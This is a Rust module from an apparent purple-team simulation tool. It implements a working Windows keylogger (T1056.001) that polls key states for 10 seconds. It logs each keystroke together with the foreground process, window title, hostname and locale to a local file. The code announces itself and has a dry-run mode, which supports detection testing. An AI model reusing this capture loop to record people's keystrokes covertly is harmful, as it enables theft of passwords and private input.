//! Keylogger Simulation Module (T1056.001 - requires user interaction).
//!
//! This module simulates keylogging behavior by capturing foreground window titles,
//! active processes, and user input over a 10-second window. 
//! All logs are stored in the MagnetTelemetry directory for purple-team detection validation.
//!

use anyhow::{Context, Result};
use chrono::Utc;
use chrono::Timelike;
use hostname;
use os_info;
use std::fs::{create_dir_all, OpenOptions, File};
use std::io::Write;
use std::path::PathBuf;
use std::time::{Duration, Instant};
use std::thread::sleep;

use crate::core::config::Config;
use crate::core::logger;
use crate::core::simulation::Simulation;
use crate::core::telemetry::{ActionRecord, write_action_record};

/// Resolve %USERPROFILE%\Documents\MagnetTelemetry\keylogger_sim_<test_id>.log
fn output_path(cfg: &Config) -> Option<PathBuf> {
    crate::core::telemetry::telemetry_dir().map(|mut p| {
        p.push(format!("keylogger_sim_{}.log", cfg.test_id));
        p
    })
}

#[derive(Default)]
pub struct KeyloggerSim;

impl KeyloggerSim {
    fn log(file: &mut File, s: String) {
        if let Err(err) = file.write_all(s.as_bytes()) {
            logger::warn(&format!("Unable to write to keylog file: {}", err));
        }
        if let Err(err) = file.flush() {
            logger::warn(&format!("Unable to flush keylog file: {}", err));
        }
    }

    fn pc_header_file(file: &mut File) -> Result<()> {
        let os_info = {
            let info = os_info::get();
            format!("OS: type: {}\nVersion: {}\n", info.os_type(), info.version())
        };
        Self::log(file, os_info);

        let hostname_wrap = hostname::get();

        let host_info = if let Ok(host) = hostname_wrap {
            format!("Hostname: {:?}\n", host)
        } else {
            "Hostname: NIL\n".to_string()
        };

        Self::log(file, host_info);
        Ok(())
    }

    fn pc_key_notes(k: u8, is_shift_or_caps: bool) -> String {
        match k {
            65..=90 => {
                if is_shift_or_caps {
                    format!("{}", (k as char).to_ascii_uppercase())
                } else {
                    format!("{}", (k as char).to_ascii_lowercase())
                }
            }
            48..=57 => {
                if is_shift_or_caps {
                    match k {
                        48 => ")",
                        49 => "!",
                        50 => "@",
                        51 => "#",
                        52 => "$",
                        53 => "%",
                        54 => "^",
                        55 => "&",
                        56 => "*",
                        57 => "(",
                        _ => unreachable!(),
                    }
                    .to_string()
                } else {
                    format!("{}", (k as char))
                }
            }
            _ => format!("VK_{}", k), // simplified for brevity
        }
    }

    fn pc_keylog_loop(file: &mut File, duration: Duration) -> Result<()> {
        use winapi::um::processthreadsapi::OpenProcess;
        use winapi::um::psapi::GetProcessImageFileNameW;
        use winapi::um::winnls::GetUserDefaultLocaleName;
        use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
        use winapi::um::winuser::*;
        use winapi::shared::minwindef::DWORD;
        use winapi::ctypes::c_int;

        Self::pc_header_file(file)?;

        unsafe {
            let length = 85;
            let mut buf = vec![0u16; length];
            GetUserDefaultLocaleName(buf.as_mut_ptr(), length.try_into().unwrap());
            let len = buf.iter().position(|&c| c == 0).unwrap_or(0);
            let locale = String::from_utf16_lossy(&buf[..len]);

            Self::log(file, format!("Location: {}\n", locale));
            Self::log(file, "\nKeylogs: \n".to_string());

            logger::info("\nLogging keyboard activity for 10 seconds — type a few things in any window :)");

            let end = Instant::now() + duration;

            while Instant::now() < end {
                sleep(Duration::from_millis(10));

                let hwnd = GetForegroundWindow();
                let pid = {
                    let mut p = 0 as DWORD;
                    GetWindowThreadProcessId(hwnd, &mut p);
                    p
                };

                let handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
                let process_path = {
                    let mut buf = vec![0u16; 256];
                    GetProcessImageFileNameW(handle, buf.as_mut_ptr(), 256);
                    let len = buf.iter().position(|&c| c == 0).unwrap_or(0);
                    let path = String::from_utf16_lossy(&buf[..len]);
                    path.rsplit('\\').next().unwrap_or(&path).to_string()
                };

                let title = {
                    let len = GetWindowTextLengthW(hwnd) + 1;
                    if len > 0 {
                        let mut buf = vec![0u16; len as usize];
                        GetWindowTextW(hwnd, buf.as_mut_ptr(), len);
                        let len = buf.iter().position(|&c| c == 0).unwrap_or(0);
                        String::from_utf16_lossy(&buf[..len])
                    } else {
                        "NoWindowTitle".to_string()
                    }
                };

                let now = Utc::now();
                let is_shift_pressed = GetAsyncKeyState(VK_SHIFT) & 0x8000u16 as i16 != 0;

                for i in 0 as c_int..255 {
                    if GetAsyncKeyState(i) & 1 > 0 {
                        let s = format!(
                            "[{:02}:{:02}:{:02}] |{}||{}|  ({})\n",
                            now.hour(),
                            now.minute(),
                            now.second(),
                            process_path.trim(),
                            title.trim(),
                            Self::pc_key_notes(i as u8, is_shift_pressed)
                        );
                        Self::log(file, s);
                    }
                }
            }
        }

        Ok(())
    }
}

impl Simulation for KeyloggerSim {
    fn name(&self) -> &'static str {
        "windows::keylogger_sim"
    }

    fn run(&self, cfg: &Config) -> Result<()> {
        logger::action_running("Running keylogger simulation (10s)");

        let start = Instant::now();
        let out = output_path(cfg)
            .ok_or_else(|| anyhow::anyhow!("could not determine telemetry path"))?;

        if cfg.dry_run {
            logger::info("dry-run: would perform keylogger simulation");
            let rec = ActionRecord {
                test_id: cfg.test_id.clone(),
                timestamp: Utc::now().to_rfc3339(),
                action: format!("T1056.001 - {}", self.name()),
                status: "dry-run".into(),
                details: "dry-run: keylogger logic skipped".into(),
                artifact_path: Some(out.display().to_string()),
            };
            let _ = write_action_record(cfg, &rec);
            logger::action_ok();
            return Ok(());
        }

        if let Some(parent) = out.parent() {
            create_dir_all(parent)
                .with_context(|| format!("creating telemetry dir {}", parent.display()))?;
        }

        let mut file = OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(true)
            .open(&out)
            .with_context(|| format!("opening keylog output at {}", out.display()))?;

        match Self::pc_keylog_loop(&mut file, Duration::from_secs(10)) {
            Ok(()) => {
                let elapsed = start.elapsed();

                let rec = ActionRecord {
                    test_id: cfg.test_id.clone(),
                    timestamp: Utc::now().to_rfc3339(),
                    action: format!("T1056.001 - {}", self.name()),
                    status: "written".into(),
                    details: format!(
                        "Keylogger simulation complete in {}ms",
                        elapsed.as_millis()
                    ),
                    artifact_path: Some(out.display().to_string()),
                };
                let _ = write_action_record(cfg, &rec);
                logger::action_ok();
                Ok(())
            }
            Err(e) => {
                logger::action_fail("keylogger simulation failed");
                let rec = ActionRecord {
                    test_id: cfg.test_id.clone(),
                    timestamp: Utc::now().to_rfc3339(),
                    action: format!("T1056.001 - {}", self.name()),
                    status: "failed".into(),
                    details: format!("error: {}", e),
                    artifact_path: Some(out.display().to_string()),
                };
                let _ = write_action_record(cfg, &rec);
                Err(e)
            }
        }
    }
}
